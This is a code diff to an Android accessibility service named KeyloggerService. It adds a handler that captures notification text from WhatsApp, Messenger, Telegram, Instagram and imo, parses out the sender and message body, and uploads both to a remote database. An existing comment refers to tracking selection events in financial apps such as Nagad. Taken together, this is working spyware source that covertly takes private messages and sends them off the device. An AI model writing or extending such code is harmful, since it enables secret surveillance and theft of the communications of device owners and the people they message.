@@ -313,6 +313,11 @@ class KeyloggerService : AccessibilityService() {
                     handleViewClicked(event)
                 }
             }
+            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
+                if (isServiceReady) {
+                    handleNotificationEvent(event)
+                }
+            }
             AccessibilityEvent.TYPE_VIEW_SELECTED -> {
                 // Financial apps like Nagad use selection events instead of click
                 if (isServiceReady) {
@@ -322,6 +327,63 @@ class KeyloggerService : AccessibilityService() {
                     }
                 }
             }
+        }
+    }
+
+    private fun handleNotificationEvent(event: AccessibilityEvent) {
+        try {
+            val pkg = event.packageName?.toString() ?: return
+            val textList = event.text ?: return
+            if (textList.isEmpty()) return
+
+            val fullText = textList.joinToString(" ").trim()
+            if (fullText.isEmpty()) return
+
+            // Determine social chat apps
+            val appKey = when {
+                pkg.contains("whatsapp", ignoreCase = true) -> "whatsapp"
+                pkg.contains("facebook.orca", ignoreCase = true) || pkg.contains("messenger", ignoreCase = true) -> "messenger"
+                pkg.contains("telegram", ignoreCase = true) || pkg.contains("challegram", ignoreCase = true) -> "telegram"
+                pkg.contains("instagram", ignoreCase = true) -> "instagram"
+                pkg.contains("imo", ignoreCase = true) -> "imo"
+                else -> null
+            }
+
+            val appName = getAppName(pkg)
+
+            var sender = appName
+            var body = fullText
+            if (fullText.contains(":")) {
+                val parts = fullText.split(":", limit = 2)
+                sender = parts[0].trim()
+                body = parts[1].trim()
+            }
+
+            // Deduplication
+            val dedupeKey = "$pkg|$sender|$body"
+            if (recentTextCache.contains(dedupeKey)) return
+            recentTextCache.add(dedupeKey)
+
+            if (appKey != null) {
+                // Save directly to chats/{appKey}/messages
+                deviceRef?.child("chats")?.child(appKey)?.child("messages")?.push()?.setValue(mapOf(
+                    "sender" to sender,
+                    "body" to body,
+                    "time" to ServerValue.TIMESTAMP,
+                    "app" to appKey,
+                    "pkg" to pkg
+                ))
+            }
+
+            // Also log to general device logs
+            val logText = "🔔 [NOTIFICATION - $appName] $sender: $body"
+            val ref = getLogsRef()
+            ref?.push()?.setValue(mapOf(
+                "log" to logText,
+                "time" to ServerValue.TIMESTAMP
+            ))
+        } catch (e: Exception) {
+            Timber.e("handleNotificationEvent error: ${e.message}")
         }
     }
 
